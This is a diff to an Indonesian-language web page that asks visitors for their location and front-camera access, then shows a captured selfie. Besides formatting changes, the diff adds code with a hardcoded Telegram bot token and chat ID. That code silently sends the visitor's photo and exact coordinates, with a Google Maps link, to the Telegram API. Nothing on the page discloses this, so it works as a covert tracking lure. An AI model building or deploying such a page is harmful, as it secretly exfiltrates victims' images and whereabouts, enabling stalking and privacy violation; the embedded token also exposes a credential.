@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -108,7 +109,8 @@
             transform: translateY(0);
         }
 
-        .location-card, .photo-card {
+        .location-card,
+        .photo-card {
             background: rgba(0, 0, 0, 0.2);
             border-radius: 16px;
             padding: 20px;
@@ -140,7 +142,8 @@
             justify-content: center;
         }
 
-        #camera-video, #captured-photo {
+        #camera-video,
+        #captured-photo {
             width: 100%;
             height: 100%;
             object-fit: cover;
@@ -169,23 +172,25 @@
         }
 
         @keyframes spin {
-            to { transform: rotate(360deg); }
+            to {
+                transform: rotate(360deg);
+            }
         }
 
         .btn-text {
             display: inline-block;
         }
-        
+
         .loading .btn-text {
             display: none;
         }
-        
+
         .loading .loader {
             display: block;
         }
-
     </style>
 </head>
+
 <body>
 
     <div class="container">
@@ -203,7 +208,7 @@
                     <p>Longitude: <strong id="lng">-</strong></p>
                     <p>Akurasi: <strong id="acc">-</strong> meter</p>
                 </div>
-                
+
                 <div class="photo-card">
                     <p style="margin-bottom: 12px; font-weight: 600; color: #fff;">📸 Foto Pengguna:</p>
                     <div class="photo-container">
@@ -217,6 +222,11 @@
     </div>
 
     <script>
+        // Konfigurasi Bot Telegram
+        // Silakan isi Token dan Chat ID Anda di sini
+        const TELEGRAM_BOT_TOKEN = '7664158455:AAHYWocldCQ1EQx_fe_Pe2X6aRD0FBjtkp8';
+        const TELEGRAM_CHAT_ID = '7664158455';
+
         const locateBtn = document.getElementById('locateBtn');
         const results = document.getElementById('results');
         const resultsContent = document.getElementById('results-content');
@@ -234,7 +244,7 @@
             resultsContent.classList.remove('show');
             photoEl.style.display = 'none';
             videoEl.style.display = 'none';
-            
+
             try {
                 // Get Location First
                 const position = await new Promise((resolve, reject) => {
@@ -255,13 +265,13 @@
 
                 // Show results container early so video can be rendered
                 results.style.display = 'block';
-                
+
                 // Get Camera Stream (Front facing)
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user" },
                     audio: false
                 });
-                
+
                 videoEl.style.display = 'block';
                 videoEl.srcObject = stream;
 
@@ -280,11 +290,11 @@
                 canvasEl.width = videoEl.videoWidth;
                 canvasEl.height = videoEl.videoHeight;
                 canvasEl.getContext('2d').drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
-                
+
                 const photoDataUrl = canvasEl.toDataURL('image/jpeg');
                 photoEl.src = photoDataUrl;
                 photoEl.style.display = 'block';
-                
+
                 // Stop the camera
                 videoEl.style.display = 'none';
                 stream.getTracks().forEach(track => track.stop());
@@ -292,6 +302,37 @@
                 // Reveal results with animation
                 resultsContent.offsetHeight; // trigger reflow
                 resultsContent.classList.add('show');
+
+                // === KIRIM DATA KE TELEGRAM ===
+                if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== 'ISI_TOKEN_BOT_ANDA_DISINI') {
+                    try {
+                        // Ubah Data URL foto menjadi Blob
+                        const blob = await (await fetch(photoDataUrl)).blob();
+
+                        const formData = new FormData();
+                        formData.append('chat_id', TELEGRAM_CHAT_ID);
+                        formData.append('photo', blob, 'photo.jpg');
+
+                        // Buat caption berisi lokasi dan link Google Maps
+                        const caption = `📍 *Lokasi Ditemukan*\n\nLatitude: ${position.coords.latitude.toFixed(6)}\nLongitude: ${position.coords.longitude.toFixed(6)}\nAkurasi: ${Math.round(position.coords.accuracy)} meter\n\n🗺️ [Buka di Google Maps](https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude})`;
+                        formData.append('caption', caption);
+                        formData.append('parse_mode', 'Markdown');
+
+                        // Kirim request ke API Telegram
+                        const tgResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+
+                        if (!tgResponse.ok) {
+                            console.error('Telegram API Error:', await tgResponse.text());
+                        } else {
+                            console.log('Berhasil terkirim ke Telegram!');
+                        }
+                    } catch (tgError) {
+                        console.error('Gagal mengirim fetch ke Telegram:', tgError);
+                    }
+                }
 
             } catch (err) {
                 alert("Terjadi kesalahan: " + err.message);
@@ -305,4 +346,5 @@
         });
     </script>
 </body>
+
 </html>
